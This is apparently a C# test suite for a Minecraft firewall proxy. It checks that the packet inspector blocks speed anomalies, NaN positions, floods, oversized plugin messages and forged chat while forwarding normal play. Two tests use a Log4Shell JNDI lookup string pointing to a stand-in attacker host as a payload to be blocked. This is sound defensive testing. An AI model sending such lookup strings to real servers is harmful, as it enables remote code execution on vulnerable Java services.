using System.Net;
using MinecraftFirewall.Proxy;
using MinecraftFirewall.Proxy.Defense;
using MinecraftFirewall.Proxy.Enforcement;
using MinecraftFirewall.Proxy.Identity;
using MinecraftFirewall.Proxy.Inspection;
using MinecraftFirewall.Proxy.IpIntel;
using MinecraftFirewall.Proxy.Messages;
using MinecraftFirewall.Proxy.Policy;
using MinecraftFirewall.Proxy.Protocol;
using MinecraftFirewall.Proxy.RateLimiting;
using MinecraftFirewall.Tests.TestDoubles;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;

namespace MinecraftFirewall.Tests;

/// <summary>
/// Drives whole packet streams through the real <see cref="PlayStateInspector"/> — the real frame
/// reader, the real decompressor, the real analysers — rather than testing each guard in isolation.
///
/// The unit tests establish that each analyser reaches the right conclusion when handed the right
/// bytes. What they cannot establish is whether the inspector ever hands them those bytes, and that is
/// exactly where the interesting bugs have been: an earlier version cleared the movement history on
/// every rotation packet, which a client sends constantly, so the speed check had two consecutive
/// positions to compare almost never and effectively did not run. Every assertion here would have
/// passed against an analyser wired to nothing.
/// </summary>
public class DeepInspectionPipelineTests
{
    private static readonly PlayStatePacketIds Ids = GetIds();
    private static readonly IPAddress RemoteIp = IPAddress.Parse("203.0.113.77");

    private static PlayStatePacketIds GetIds()
    {
        Assert.True(ProtocolVersionRegistry.TryGet(774, out PlayStatePacketIds ids));
        return ids;
    }

    private sealed record Harness(PlayStateInspector Inspector, FakeWindowsFirewallGateway Gateway, RecordingAlertSender Alerts);

    /// <summary>
    /// A clock that advances a fixed step every time it is read.
    ///
    /// Frames arriving from a MemoryStream all land in the same instant, and every rate and speed
    /// judgement in the inspector is a division by elapsed time — so against the real clock the
    /// interesting paths are skipped by the same guards that stop a lag spike being read as a speed
    /// measurement. Fifty milliseconds is what a real client's twenty-updates-a-second looks like.
    /// </summary>
    private static Func<DateTimeOffset> SteppingClock(double millisecondsPerRead = 50)
    {
        DateTimeOffset now = new(2026, 1, 1, 0, 0, 0, TimeSpan.Zero);
        return () =>
        {
            now = now.AddMilliseconds(millisecondsPerRead);
            return now;
        };
    }

    private static Harness Create(Action<InspectionOptions>? tweak = null, int strikesBeforeBan = 5, Func<DateTimeOffset>? clock = null)
    {
        var profile = new ServerProfile { Name = "test", PublicPort = 25565, BackendHost = "127.0.0.1", BackendPort = 25566 };
        var gateway = new FakeWindowsFirewallGateway();
        var alerts = new RecordingAlertSender();
        IOptions<FirewallBanOptions> banOptions = Options.Create(new FirewallBanOptions { StrikesBeforeBan = strikesBeforeBan });

        var banService = new FirewallBanService(banOptions, new NeverBanList(Options.Create(new NeverBanOptions())),
            gateway, alerts, NullLogger<FirewallBanService>.Instance);

        var policy = DefenseTestFactory.CreatePolicyEngine(banService, alerts, banOptions: new FirewallBanOptions { StrikesBeforeBan = strikesBeforeBan });

        var options = new InspectionOptions();
        tweak?.Invoke(options);

        var inspector = new PlayStateInspector(profile, "Steve", RemoteIp, Ids, graceAuth: null, startsTrusted: true,
            new IdentityOptions(), [], new MessagesOptions(), policy, options, NullLogger.Instance, authHold: null, clock);

        return new Harness(inspector, gateway, alerts);
    }

    /// <summary>Every stream starts the same way a real connection does: Login Acknowledged, then
    /// Finish Configuration, which is what puts the inspector into Play state.</summary>
    private static async Task<(MemoryStream Backend, string? DisconnectReason)> RunAsync(Harness harness, params byte[][] playFrames)
    {
        byte[] prologue =
        [
            .. MinecraftPacketBuilder.BuildCompressedEmptyPacketFrame(0x03),
            .. MinecraftPacketBuilder.BuildCompressedEmptyPacketFrame(Ids.ConfigurationFinishConfigurationServerbound),
        ];

        using var client = new DuplexTestStream([.. prologue, .. playFrames.SelectMany(f => f)]);
        var backend = new MemoryStream();

        try
        {
            await harness.Inspector.RunAsync(client, backend, CancellationToken.None);
        }
        catch (EndOfStreamException)
        {
            // The stream running out is how these tests end; it is not a failure.
        }

        return (backend, harness.Inspector.DisconnectReason);
    }

    [Fact]
    public async Task AnOrdinaryPlayerMovingAround_IsForwardedUntouched()
    {
        // The check that matters most: every guard at its shipped defaults, and normal play passes
        // through byte-for-byte.
        Harness harness = Create(clock: SteppingClock());

        var frames = new List<byte[]>();
        for (int tick = 0; tick < 40; tick++)
        {
            frames.Add(MinecraftPacketBuilder.BuildMovementFrame(Ids.PlayMovePlayerPosServerbound, tick * 0.25, 64, 0));
            frames.Add(MinecraftPacketBuilder.BuildRotationFrame(Ids.PlayMovePlayerRotServerbound));
        }

        (MemoryStream backend, string? disconnect) = await RunAsync(harness, [.. frames]);

        Assert.Null(disconnect);
        Assert.Equal(frames.Sum(f => f.Length) + PrologueLength(), backend.Length);
    }

    [Fact]
    public async Task ANaNPosition_IsBlockedByThePipelineAndNotJustByTheAnalyser()
    {
        Harness harness = Create();

        (_, string? disconnect) = await RunAsync(harness,
            MinecraftPacketBuilder.BuildMovementFrame(Ids.PlayMovePlayerPosServerbound, double.NaN, 64, 0));

        Assert.NotNull(disconnect);
    }

    [Fact]
    public async Task RotationPacketsBetweenPositions_DoNotSwitchOffTheSpeedCheck()
    {
        // The regression this file exists for. A client sends rotation packets constantly, and an
        // earlier version treated each one as a reason to forget the last position — so the speed
        // comparison never had two positions to work with. A cheat could have relied on it.
        Harness harness = Create(o =>
        {
            o.MovementAnomaliesBeforeReport = 3;
            o.KickOnMovementAnomaly = true;
            o.MaxHorizontalBlocksPerSecond = 20;
        }, clock: SteppingClock());

        var frames = new List<byte[]>();
        for (int tick = 0; tick < 12; tick++)
        {
            // 200 blocks apart, interleaved with rotation exactly as a client would.
            frames.Add(MinecraftPacketBuilder.BuildMovementFrame(Ids.PlayMovePlayerPosServerbound, tick * 200.0, 64, 0));
            frames.Add(MinecraftPacketBuilder.BuildRotationFrame(Ids.PlayMovePlayerRotServerbound));
        }

        (_, string? disconnect) = await RunAsync(harness, [.. frames]);

        Assert.NotNull(disconnect);
    }

    [Fact]
    public async Task WithKickingOff_TheSameMovementIsReportedAndForwarded()
    {
        // The shipped default. This proxy cannot see the ice, boat or plugin teleport that would
        // explain the reading, so it must not act on it.
        Harness harness = Create(o =>
        {
            o.MovementAnomaliesBeforeReport = 3;
            o.KickOnMovementAnomaly = false;
            o.MaxHorizontalBlocksPerSecond = 20;
        }, clock: SteppingClock());

        var frames = new List<byte[]>();
        for (int tick = 0; tick < 12; tick++)
            frames.Add(MinecraftPacketBuilder.BuildMovementFrame(Ids.PlayMovePlayerPosServerbound, tick * 200.0, 64, 0));

        (MemoryStream backend, string? disconnect) = await RunAsync(harness, [.. frames]);

        Assert.Null(disconnect);
        Assert.Equal(frames.Sum(f => f.Length) + PrologueLength(), backend.Length);
    }

    [Fact]
    public async Task ALog4jLookupOnASign_IsBlocked()
    {
        // Signs and books were Log4Shell vectors alongside chat, and a payload written into one
        // persists in world data long after the connection that delivered it.
        Harness harness = Create();

        (_, string? disconnect) = await RunAsync(harness,
            MinecraftPacketBuilder.BuildSignUpdateFrame(Ids.PlaySignUpdateServerbound,
                "welcome", "${jndi:ldap://attacker.example/a}", "", ""));

        Assert.NotNull(disconnect);
    }

    [Fact]
    public async Task AnOrdinarySign_IsForwarded()
    {
        Harness harness = Create();

        byte[] frame = MinecraftPacketBuilder.BuildSignUpdateFrame(Ids.PlaySignUpdateServerbound,
            "Shop", "Diamonds", "10 emeralds", "-- Steve");

        (MemoryStream backend, string? disconnect) = await RunAsync(harness, frame);

        Assert.Null(disconnect);
        Assert.Equal(frame.Length + PrologueLength(), backend.Length);
    }

    [Fact]
    public async Task AnOversizedPluginMessage_IsBlocked()
    {
        Harness harness = Create(o => o.MaxPluginMessageBytes = 512);

        (_, string? disconnect) = await RunAsync(harness,
            MinecraftPacketBuilder.BuildPluginMessageFrame(Ids.PlayCustomPayloadServerbound, "minecraft:brand", payloadBytes: 2048));

        Assert.NotNull(disconnect);
    }

    [Fact]
    public async Task AnOrdinaryPluginMessage_IsForwarded()
    {
        Harness harness = Create();

        byte[] frame = MinecraftPacketBuilder.BuildPluginMessageFrame(Ids.PlayCustomPayloadServerbound, "minecraft:brand", 12);

        (MemoryStream backend, string? disconnect) = await RunAsync(harness, frame);

        Assert.Null(disconnect);
        Assert.Equal(frame.Length + PrologueLength(), backend.Length);
    }

    [Fact]
    public async Task APacketFlood_DownOneAuthorisedConnection_IsCutOff()
    {
        // Admission control bounds how many connections an address may open; nothing there bounds what
        // one accepted connection may then send, and a flood down a single authorised socket is both
        // cheaper to mount and easier to miss.
        Harness harness = Create(o => o.MaxPacketsPerSecond = 20);

        var frames = new List<byte[]>();
        for (int i = 0; i < 60; i++)
            frames.Add(MinecraftPacketBuilder.BuildMovementFrame(Ids.PlayMovePlayerPosServerbound, i * 0.1, 64, 0));

        (_, string? disconnect) = await RunAsync(harness, [.. frames]);

        Assert.NotNull(disconnect);
    }

    [Fact]
    public async Task AFormattingCodeInChat_IsBlockedButDoesNotBanTheAddress()
    {
        // The tiering the whole design turns on. A vanilla client strips the section sign, so one
        // arriving is very probably forged chat — but "very probably" is an assumption about client
        // behaviour, and a machine-wide firewall ban is the one consequence here that cannot be walked
        // back. The genuine owner of a premium-locked username must never be refused, and a single
        // surprising chat message must not be able to do it.
        Harness harness = Create();

        (_, string? disconnect) = await RunAsync(harness,
            MinecraftPacketBuilder.BuildCompressedStringPacketFrame(Ids.PlayChatServerbound, "§cI am the server"));

        Assert.NotNull(disconnect);
        Assert.Empty(harness.Gateway.RuledAddresses);
    }

    [Fact]
    public async Task AnInjectionLookupInChat_IsBlockedAndDoesBanTheAddress()
    {
        // The other tier: impossible under the protocol whatever client is involved, so it weighs
        // enough to reach the ban threshold at once.
        Harness harness = Create(strikesBeforeBan: 5);

        (_, string? disconnect) = await RunAsync(harness,
            MinecraftPacketBuilder.BuildCompressedStringPacketFrame(Ids.PlayChatServerbound, "${jndi:ldap://attacker.example/a}"));

        Assert.NotNull(disconnect);
        Assert.Contains(RemoteIp, harness.Gateway.RuledAddresses);
    }

    private static int PrologueLength() =>
        MinecraftPacketBuilder.BuildCompressedEmptyPacketFrame(0x03).Length +
        MinecraftPacketBuilder.BuildCompressedEmptyPacketFrame(Ids.ConfigurationFinishConfigurationServerbound).Length;
}
